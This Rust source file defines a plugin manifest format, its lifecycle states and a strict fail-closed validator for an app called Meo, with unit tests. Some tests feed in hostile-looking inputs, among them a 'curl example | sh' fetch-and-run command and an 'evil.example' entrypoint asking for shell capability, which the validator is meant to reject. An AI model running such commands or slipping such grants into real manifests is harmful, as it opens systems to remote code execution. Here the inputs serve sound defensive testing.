//! Plugin manifest v1 and its lifecycle (MEO-030).
//!
//! A manifest is a declarative description of one optional capability: a provider adapter, a
//! hosted connector, a Skill, a bundle, or a built-in. It says what the plugin *offers* and what
//! it *asks for*. It never grants anything: permission checks happen when a call is made, and a
//! Skill stays untrusted text.
//!
//! v1 executes no downloaded code. An `entrypoint`, when present, is the https address of a
//! hosted service the server brokers; there is no field for a script, archive or local path.
//!
//! Three records are deliberately separate and must stay so:
//! - the built-in catalogue (`plugin_store.json`) — what Meo ships;
//! - the account's installed-plugin records (Meo API) — what this user installed;
//! - runtime lifecycle state (this module) — whether calls are allowed right now.
//!
//! The validator fails closed: an unknown field, an unknown enum value or a malformed value is an
//! error, not something to ignore. See `meo/docs/plugins-and-connectors.md`.

use serde::{Deserialize, Serialize};
use serde_json::Value;

pub const MANIFEST_VERSION: u32 = 1;
const MAX_ORIGINS: usize = 10;
const MAX_SETTINGS: usize = 20;
const MAX_CAPABILITIES: usize = 32;

/// What kind of optional capability this is.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Kind {
    /// A model provider adapter (OpenAI, Anthropic, ...). Bundled in v1.
    ProviderAdapter,
    /// A hosted connector reached over https (OAuth/MCP), brokered by Meo API.
    Connector,
    /// Instructions only. Never executable, never authority.
    Skill,
    /// Installs several Skills and/or connectors together.
    Bundle,
    /// Shipped with Meo and trusted, but still uses the same capability and permission contracts.
    Builtin,
}

/// Where an install is in its life. `Removed` is terminal; reinstalling creates a new record.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Lifecycle {
    Discovered,
    Installed,
    Connected,
    Enabled,
    Unavailable,
    Failed,
    Disabled,
    Removed,
}

impl Lifecycle {
    /// Whether a tool call may run now. Everything else must refuse.
    pub fn accepts_calls(self) -> bool {
        matches!(self, Lifecycle::Enabled | Lifecycle::Connected)
    }

    /// Whether the user may switch it on from here.
    pub fn can_enable(self) -> bool {
        matches!(
            self,
            Lifecycle::Installed | Lifecycle::Connected | Lifecycle::Unavailable
        )
    }

    /// The only legal moves. Disabling stops new calls; it does not delete user data.
    pub fn transition(self, next: Lifecycle) -> Result<Lifecycle, String> {
        let allowed = match self {
            Lifecycle::Discovered => matches!(next, Lifecycle::Installed | Lifecycle::Removed),
            Lifecycle::Installed => matches!(
                next,
                Lifecycle::Connected | Lifecycle::Enabled | Lifecycle::Disabled
                    | Lifecycle::Failed | Lifecycle::Unavailable | Lifecycle::Removed
            ),
            Lifecycle::Connected => matches!(
                next,
                Lifecycle::Enabled | Lifecycle::Disabled | Lifecycle::Unavailable
                    | Lifecycle::Failed | Lifecycle::Removed
            ),
            Lifecycle::Enabled => matches!(
                next,
                Lifecycle::Disabled | Lifecycle::Unavailable | Lifecycle::Failed | Lifecycle::Removed
            ),
            Lifecycle::Unavailable => matches!(
                next,
                Lifecycle::Connected | Lifecycle::Enabled | Lifecycle::Disabled
                    | Lifecycle::Failed | Lifecycle::Removed
            ),
            Lifecycle::Failed => matches!(
                next,
                Lifecycle::Installed | Lifecycle::Connected | Lifecycle::Disabled | Lifecycle::Removed
            ),
            Lifecycle::Disabled => matches!(
                next,
                Lifecycle::Enabled | Lifecycle::Connected | Lifecycle::Removed
            ),
            // Installing again creates a new install record; a removed plugin never comes back
            // to life under the same record.
            Lifecycle::Removed => false,
        };
        if allowed {
            Ok(next)
        } else {
            Err(format!(
                "invalid_lifecycle_transition:{:?}->{:?}",
                self, next
            ))
        }
    }
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct Publisher {
    pub id: String,
    #[serde(default)]
    pub name: String,
    #[serde(default)]
    pub url: Option<String>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct Compatibility {
    /// A version range such as `>=0.9 <2`; interpreted by the host, not by the plugin.
    #[serde(default)]
    pub meo_core: String,
    #[serde(default)]
    pub meo_api: String,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct Capability {
    pub id: String,
    #[serde(default = "one")]
    pub input_schema: u32,
    #[serde(default = "one")]
    pub output_schema: u32,
    #[serde(default)]
    pub surfaces: Vec<String>,
}

fn one() -> u32 {
    1
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum DataCategory {
    Text,
    Images,
    Audio,
    Files,
    AccountProfile,
    ProjectContext,
    ConversationHistory,
    UsageMetrics,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Effect {
    Read,
    Write,
    Execute,
    Network,
}

#[derive(Debug, Clone, Default, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct Permissions {
    #[serde(default)]
    pub data_categories: Vec<DataCategory>,
    #[serde(default)]
    pub effects: Vec<Effect>,
}

#[derive(Debug, Clone, Default, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct Network {
    /// Exact https origins, for example `https://api.githubcopilot.com`. No paths or wildcards.
    #[serde(default)]
    pub origins: Vec<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SettingKind {
    Text,
    Number,
    Boolean,
    Secret,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct SettingField {
    pub key: String,
    pub kind: SettingKind,
    #[serde(default)]
    pub label: String,
    #[serde(default)]
    pub max_length: Option<u32>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum UiSlot {
    SettingsSection,
    PageSection,
    ComposerAction,
    Toolbar,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct UiContribution {
    pub slot: UiSlot,
    /// A registered renderer id. Contributors choose among known renderers; they never send QML,
    /// HTML, JavaScript or arbitrary action payloads.
    pub renderer: String,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct Manifest {
    pub manifest_version: u32,
    pub id: String,
    pub version: String,
    pub name: String,
    #[serde(default)]
    pub description: String,
    pub publisher: Publisher,
    pub kind: Kind,
    #[serde(default)]
    pub compatibility: Option<Compatibility>,
    /// A hosted https service only. v1 has no field for executable code.
    #[serde(default)]
    pub entrypoint: Option<String>,
    #[serde(default)]
    pub capabilities: Vec<Capability>,
    #[serde(default)]
    pub permissions: Permissions,
    #[serde(default)]
    pub network: Network,
    #[serde(default)]
    pub settings: Vec<SettingField>,
    #[serde(default)]
    pub ui: Vec<UiContribution>,
    #[serde(default)]
    pub dependencies: Vec<String>,
    /// `sha256:<64 lowercase hex>` of the manifest payload.
    #[serde(default)]
    pub integrity: Option<String>,
    #[serde(default)]
    pub signature: Option<String>,
    #[serde(default)]
    pub update_channel: Option<String>,
}

fn identifier(value: &str, max: usize) -> bool {
    let mut chars = value.chars();
    let Some(first) = chars.next() else {
        return false;
    };
    value.len() <= max
        && first.is_ascii_lowercase()
        && chars.all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '.' | '_' | '-'))
}

fn version_ok(value: &str) -> bool {
    let core = value.split_once('-').map_or(value, |(head, _)| head);
    let parts: Vec<&str> = core.split('.').collect();
    parts.len() == 3
        && parts
            .iter()
            .all(|p| !p.is_empty() && p.len() <= 6 && p.chars().all(|c| c.is_ascii_digit()))
}

/// Exact https origin: scheme, host and optional port only. No userinfo, path, query or fragment.
fn origin_ok(value: &str) -> bool {
    let Some(rest) = value.strip_prefix("https://") else {
        return false;
    };
    if rest.is_empty() || rest.contains(['/', '?', '#', '@', ' ']) {
        return false;
    }
    let (host, port) = match rest.rsplit_once(':') {
        Some((host, port)) if !port.is_empty() && port.chars().all(|c| c.is_ascii_digit()) => {
            (host, true)
        }
        _ => (rest, false),
    };
    let _ = port;
    host.contains('.')
        && !host.starts_with('.')
        && !host.ends_with('.')
        && host
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-'))
}

/// A https address a hosted service serves. Hosted only: no scripts, archives or local paths.
fn hosted_endpoint_ok(value: &str) -> bool {
    value.len() <= 500
        && value.starts_with("https://")
        && !value.contains(['\u{0000}', ' '])
        && !value.to_ascii_lowercase().ends_with(".js")
        && !value.to_ascii_lowercase().ends_with(".mjs")
        && !value.to_ascii_lowercase().ends_with(".wasm")
        && !value.to_ascii_lowercase().ends_with(".zip")
        && origin_ok(&value.split('/').take(3).collect::<Vec<_>>().join("/"))
}

/// Strictly validates one manifest. Every problem is returned; nothing invalid is ignored.
pub fn validate_manifest(value: &Value) -> Result<Manifest, Vec<String>> {
    let manifest: Manifest = match serde_json::from_value(value.clone()) {
        Ok(manifest) => manifest,
        Err(error) => return Err(vec![format!("manifest_invalid:{error}")]),
    };
    let mut errors = Vec::new();
    if manifest.manifest_version != MANIFEST_VERSION {
        errors.push(format!(
            "unsupported_manifest_version:{}",
            manifest.manifest_version
        ));
    }
    if !identifier(&manifest.id, 64) {
        errors.push("invalid_id".into());
    }
    if !version_ok(&manifest.version) {
        errors.push("invalid_version".into());
    }
    if manifest.name.trim().is_empty() || manifest.name.len() > 80 {
        errors.push("invalid_name".into());
    }
    if manifest.description.len() > 500 {
        errors.push("description_too_long".into());
    }
    if !identifier(&manifest.publisher.id, 64) {
        errors.push("invalid_publisher".into());
    }
    if manifest.publisher.name.len() > 80 {
        errors.push("publisher_name_too_long".into());
    }
    if let Some(url) = &manifest.publisher.url {
        if !hosted_endpoint_ok(url) {
            errors.push("invalid_publisher_url".into());
        }
    }
    if let Some(endpoint) = &manifest.entrypoint {
        // v1 never loads code: the only allowed entrypoint is a hosted https service.
        if !hosted_endpoint_ok(endpoint) {
            errors.push("entrypoint_must_be_hosted_https".into());
        }
    }

    if manifest.capabilities.len() > MAX_CAPABILITIES {
        errors.push("too_many_capabilities".into());
    }
    let mut capability_ids = std::collections::BTreeSet::new();
    for capability in &manifest.capabilities {
        if !identifier(&capability.id, 64) || !capability_ids.insert(capability.id.clone()) {
            errors.push(format!("invalid_capability:{}", capability.id));
        }
        if capability.input_schema == 0
            || capability.input_schema > 99
            || capability.output_schema == 0
            || capability.output_schema > 99
        {
            errors.push(format!("invalid_capability_schema:{}", capability.id));
        }
    }

    if manifest.network.origins.len() > MAX_ORIGINS {
        errors.push("too_many_origins".into());
    }
    for origin in &manifest.network.origins {
        if !origin_ok(origin) {
            errors.push(format!("invalid_origin:{origin}"));
        }
    }

    if manifest.settings.len() > MAX_SETTINGS {
        errors.push("too_many_settings".into());
    }
    let mut setting_keys = std::collections::BTreeSet::new();
    for field in &manifest.settings {
        if !identifier(&field.key, 64) || !setting_keys.insert(field.key.clone()) {
            errors.push(format!("invalid_setting:{}", field.key));
        }
        if field.label.len() > 120 || field.max_length.is_some_and(|max| max > 4096) {
            errors.push(format!("invalid_setting_limits:{}", field.key));
        }
    }

    let mut renderers = std::collections::BTreeSet::new();
    for contribution in &manifest.ui {
        if !identifier(&contribution.renderer, 64) || !renderers.insert(contribution.renderer.clone()) {
            errors.push(format!("invalid_renderer:{}", contribution.renderer));
        }
    }

    for dependency in &manifest.dependencies {
        if !identifier(dependency, 64) {
            errors.push(format!("invalid_dependency:{dependency}"));
        }
    }

    if let Some(integrity) = &manifest.integrity {
        let valid = integrity
            .strip_prefix("sha256:")
            .is_some_and(|hex| hex.len() == 64 && hex.chars().all(|c| c.is_ascii_hexdigit() && !c.is_ascii_uppercase()));
        if !valid {
            errors.push("invalid_integrity".into());
        }
    } else if !matches!(manifest.kind, Kind::Builtin | Kind::Skill) {
        errors.push("integrity_required".into());
    }
    if let Some(signature) = &manifest.signature {
        if signature.len() < 16 || signature.len() > 1024 {
            errors.push("invalid_signature".into());
        }
    }
    if let Some(channel) = &manifest.update_channel {
        if !matches!(channel.as_str(), "stable" | "beta") {
            errors.push(format!("invalid_update_channel:{channel}"));
        }
    }

    // A Skill is text: it may not bring tools, permissions, network access, settings or UI.
    if manifest.kind == Kind::Skill {
        if !manifest.capabilities.is_empty()
            || !manifest.permissions.data_categories.is_empty()
            || !manifest.permissions.effects.is_empty()
            || !manifest.network.origins.is_empty()
            || !manifest.settings.is_empty()
            || !manifest.ui.is_empty()
            || manifest.entrypoint.is_some()
            || !manifest.dependencies.is_empty()
        {
            errors.push("skill_cannot_grant_capabilities".into());
        }
    }
    // A Bundle installs others; it brings no own capability or permission.
    if manifest.kind == Kind::Bundle {
        if manifest.dependencies.is_empty() {
            errors.push("bundle_without_dependencies".into());
        }
        if !manifest.capabilities.is_empty() || manifest.entrypoint.is_some() {
            errors.push("bundle_cannot_have_capabilities".into());
        }
    }
    // A connector is a hosted service with a declared origin; it cannot be a local entrypoint.
    if manifest.kind == Kind::Connector {
        let hosted = manifest.entrypoint.is_some() || !manifest.network.origins.is_empty();
        if !hosted {
            errors.push("connector_needs_hosted_origin".into());
        }
    }
    // A bundled adapter/built-in declares its host in code; v1 does not accept a remote entrypoint.
    if matches!(manifest.kind, Kind::ProviderAdapter | Kind::Builtin)
        && manifest.entrypoint.is_some()
    {
        errors.push("bundled_plugin_cannot_have_entrypoint".into());
    }

    if errors.is_empty() {
        Ok(manifest)
    } else {
        Err(errors)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn skill() -> Value {
        json!({
            "manifest_version": 1,
            "id": "meo.skill.writing",
            "version": "1.0.0",
            "name": "Writing",
            "description": "Clear prose.",
            "publisher": { "id": "meo", "name": "Meo" },
            "kind": "skill",
            "integrity": "sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
        })
    }

    fn connector() -> Value {
        json!({
            "manifest_version": 1,
            "id": "meo.connector.github",
            "version": "1.2.0",
            "name": "GitHub",
            "publisher": { "id": "meo", "name": "Meo", "url": "https://meoarch.org" },
            "kind": "connector",
            "entrypoint": "https://api.githubcopilot.com/mcp/",
            "capabilities": [
                { "id": "repo.read", "input_schema": 1, "output_schema": 1, "surfaces": ["chat"] }
            ],
            "permissions": { "data_categories": ["text", "files"], "effects": ["read", "network"] },
            "network": { "origins": ["https://api.githubcopilot.com"] },
            "integrity": "sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
        })
    }

    #[test]
    fn a_text_skill_is_valid_and_grants_nothing() {
        let manifest = validate_manifest(&skill()).unwrap();
        assert_eq!(manifest.kind, Kind::Skill);
        assert!(manifest.capabilities.is_empty());
        assert!(manifest.permissions.effects.is_empty());
    }

    #[test]
    fn a_skill_cannot_smuggle_capabilities_permissions_or_a_hosted_endpoint() {
        let mut value = skill();
        value["capabilities"] = json!([{ "id": "run.shell", "surfaces": ["chat"] }]);
        value["permissions"] = json!({ "effects": ["execute"] });
        value["entrypoint"] = json!("https://evil.example/run");
        let errors = validate_manifest(&value).unwrap_err();
        assert!(errors.contains(&"skill_cannot_grant_capabilities".to_owned()), "{errors:?}");
    }

    #[test]
    fn a_hosted_connector_with_declared_origins_is_valid() {
        let manifest = validate_manifest(&connector()).unwrap();
        assert_eq!(manifest.kind, Kind::Connector);
        assert_eq!(manifest.network.origins, vec!["https://api.githubcopilot.com"]);
    }

    #[test]
    fn unknown_fields_and_versions_fail_closed() {
        let mut value = connector();
        value["exec"] = json!("curl example | sh");
        assert!(validate_manifest(&value).is_err(), "an unknown field is an error");
        let mut value = connector();
        value["manifest_version"] = json!(2);
        assert!(validate_manifest(&value).unwrap_err().contains(&"unsupported_manifest_version:2".to_owned()));
    }

    #[test]
    fn insecure_or_odd_origins_are_rejected() {
        for origin in [
            "http://api.example.com",
            "https://api.example.com/v1",
            "https://user@api.example.com",
            "https://api.example.com?x=1",
            "https://localhost:8080",
        ] {
            let mut value = connector();
            value["network"] = json!({ "origins": [origin] });
            assert!(validate_manifest(&value).is_err(), "{origin} must not be allowed");
        }
    }

    #[test]
    fn v1_accepts_no_executable_entrypoint() {
        for endpoint in [
            "https://cdn.example.com/plugin.wasm",
            "https://cdn.example.com/plugin.zip",
            "ftp://example.com/run",
            "/usr/local/bin/run",
        ] {
            let mut value = connector();
            value["entrypoint"] = json!(endpoint);
            assert!(validate_manifest(&value).is_err(), "{endpoint} must not be allowed");
        }
    }

    #[test]
    fn a_bundle_installs_others_and_has_no_capability_of_its_own() {
        let mut value = skill();
        value["kind"] = json!("bundle");
        value["dependencies"] = json!(["meo.skill.writing"]);
        assert!(validate_manifest(&value).is_ok());
        value["capabilities"] = json!([{ "id": "own.tool" }]);
        assert!(validate_manifest(&value).unwrap_err().contains(&"bundle_cannot_have_capabilities".to_owned()));
        let mut empty = skill();
        empty["kind"] = json!("bundle");
        assert!(validate_manifest(&empty).unwrap_err().contains(&"bundle_without_dependencies".to_owned()));
    }

    #[test]
    fn integrity_is_required_for_distributed_kinds() {
        let mut value = connector();
        value.as_object_mut().unwrap().remove("integrity");
        assert!(validate_manifest(&value).unwrap_err().contains(&"integrity_required".to_owned()));
        let mut broken = connector();
        broken["integrity"] = json!("sha256:nothex");
        assert!(validate_manifest(&broken).unwrap_err().contains(&"invalid_integrity".to_owned()));
    }

    #[test]
    fn lifecycle_allows_only_legal_moves_and_disabling_stops_calls() {
        assert!(Lifecycle::Enabled.accepts_calls());
        assert!(Lifecycle::Connected.accepts_calls());
        for state in [
            Lifecycle::Discovered,
            Lifecycle::Installed,
            Lifecycle::Disabled,
            Lifecycle::Failed,
            Lifecycle::Unavailable,
            Lifecycle::Removed,
        ] {
            assert!(!state.accepts_calls(), "{state:?} must not run calls");
        }
        assert_eq!(
            Lifecycle::Enabled.transition(Lifecycle::Disabled),
            Ok(Lifecycle::Disabled)
        );
        assert!(Lifecycle::Disabled.transition(Lifecycle::Enabled).is_ok());
        assert!(Lifecycle::Removed.transition(Lifecycle::Enabled).is_err());
        assert!(Lifecycle::Discovered.transition(Lifecycle::Enabled).is_err());
        assert!(!Lifecycle::Removed.can_enable());
        assert!(Lifecycle::Installed.can_enable());
    }
}
